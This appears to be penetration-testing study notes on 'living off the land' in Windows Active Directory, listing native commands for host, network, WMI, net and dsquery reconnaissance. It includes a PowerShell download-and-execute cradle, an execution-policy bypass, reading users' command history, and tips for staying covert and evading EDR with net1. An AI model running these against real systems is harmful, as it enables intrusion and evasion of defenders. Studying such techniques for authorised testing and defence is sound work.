# Living Off the Land

## Introduction

* "Living off the land" can be <mark style="color:yellow;">defined as using tools native to Windows and AD</mark>
* This can also be a much more <mark style="color:yellow;">stealthy approach</mark>!

## Environment Commands for Host & Network Recon

```
hostname

[System.Environment]::OSVersion.Version

wmic qfe get Caption,Description,HotFixID,InstalledOn

ipconfig /all

set %USERDOMAIN%

set %logonserver%
```

## Harnessing PowerShell

### Quick Checks

```
Get-Module

Get-ExecutionPolicy -List

Set-ExecutionPolicy Bypass -Scope Process

Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

Get-ChildItem Env: | ft Key,Value

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
```

## Checking Defenses

### Firewall Checks

```
netsh advfirewall show allprofiles
```

### Windows Defender Check (from CMD.exe)

```
sc query windefend
```

### Get-MpComputerStatus

```
Get-MpComputerStatus
```

### Am I Alone?

* <mark style="color:yellow;">This is very useful for finding out if you are the only one logged in or not</mark>
* This is useful because your actions can be detected by others when moving covertly

```
qwinsta
```

## Network Information

```
arp -a 

ipconfig /all

route print

netsh advfirewall show state
```

## Windows Management Instrumentation (WMI)

* <mark style="color:yellow;">A.K.A. WMI is a scripting engine that is widely used within Windows enterprise environments to retrieve information and to run administrative tasks on local and remote hosts</mark>

### WMI Checks

<mark style="color:yellow;">Prints the patch level and description of the Hotfixes applied:</mark>

```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

<mark style="color:yellow;">Displays basic host information to include any attributes within the list:</mark>

```
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
```

<mark style="color:yellow;">A listing of all processes on host:</mark>

```
wmic process list /format:list
```

<mark style="color:yellow;">Displays information about the Domain and Domain Controllers:</mark>

```
wmic ntdomain list /format:list
```

<mark style="color:yellow;">Displays information about all local accounts and any domain accounts that have logged into the device:</mark>

```
wmic useraccount list /format:list
```

<mark style="color:yellow;">Information about all local groups:</mark>

```
wmic group list /format:list
```

<mark style="color:yellow;">Dumps information about any system accounts that are being used as service accounts:</mark>

```
wmic sysaccount list /format:list
```

### WMI Cheat Sheet

{% embed url="https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4" %}

## Net Commands

* These commands can be extremely beneficial to use when attempting to enumerate information from the domain
* <mark style="color:yellow;">These commands can be used to query the local host as well as remote hosts</mark>

<mark style="color:yellow;">With Net, we can list information such as</mark>:&#x20;

* Local and domain users
* Groups
* Hosts
* Specific users in groups
* Domain Controllers
* Password requirements

<mark style="color:red;">WARNING</mark>: net.exe commands are often monitored by EDR solutions and can quickly reveal compromise!

<figure><img src="../../.gitbook/assets/image (1) (1) (7) (1).png" alt=""><figcaption></figcaption></figure>

### Net Commands Trick

* <mark style="color:yellow;">Use net1 instead of net to execute the same functions without setting off alarms to defenders!</mark>

## DSQuery

Obtain a list of disabled users with administrative access and append the -attr to display the description associated with that user:&#x20;

```
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"  -attr description
```

{% embed url="https://social.technet.microsoft.com/wiki/contents/articles/2195.active-directory-dsquery-commands.aspx" %}
